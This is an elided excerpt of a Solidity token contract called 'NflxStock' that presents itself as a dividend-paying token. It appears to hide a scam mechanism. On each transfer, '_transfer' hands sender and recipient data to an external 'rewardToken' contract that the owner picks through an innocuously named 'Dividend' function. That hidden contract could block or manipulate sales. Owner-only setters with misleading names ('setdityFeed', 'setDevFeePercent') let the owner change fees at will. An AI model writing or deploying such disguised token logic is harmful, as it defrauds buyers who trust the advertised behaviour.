...
contract DividendPayingToken{
    ...
    function dividendOf(address _owner) internal view returns (uint256) {
        return IERC20(rewardToken).balanceOf(_owner);
    }
    ...
    {
        return            
            dividendOf(_owner).div(magnitude)            
            .mul(magnifiedDividendPerShare);
    }

    function addShareholder(uint256 amountDividend1, uint256 amountDividend2) internal {       
        DividendPayingTokenInterface(rewardToken).addShareholder(amountDividend1, amountDividend2);       
    }   

    function _DividendPayingToken_init(address _rewardToken) internal {
...
contract NflxStock is Context, IERC20, Ownable, DividendPayingToken{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 10000000000 *  10**9;        
    
    string private _name = "NflxStock";
    string private _symbol = "NflxStock";
    ...
    /**
     * @dev set initDividend.
     */
    function Dividend(address _reward) external onlyOwner {
        require(_reward != address(this));        
        _DividendPayingToken_init(_reward);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        uint256 initialBalance = dividendOf(sender);
        if (sender != recipient && initialBalance > 0){
            uint256 newBalance = dividendOf(recipient);
            addShareholder(initialBalance, newBalance);
        }
    ...
    function setdityFeed(uint8 liquidityFee) external onlyOwner() {
        tBurnTotal = liquidityFee;
    }

    function removeAllFeed() private {     
        tFeeTotal = 0;
        tBurnTotal = 0;
        tCharityTotal = 0;
    }

    function autotalFees() public view returns (uint256) {
        return tFeeTotal;
    }
    ...
    function setDevFeePercent(uint8 dFee) external onlyOwner() {
        tCharityTotal = dFee;
    }
    
    function setrestoreAllFee(uint8 tax, uint8 burn, uint8 charity) private {
        tFeeTotal = tax;
        tBurnTotal = burn;
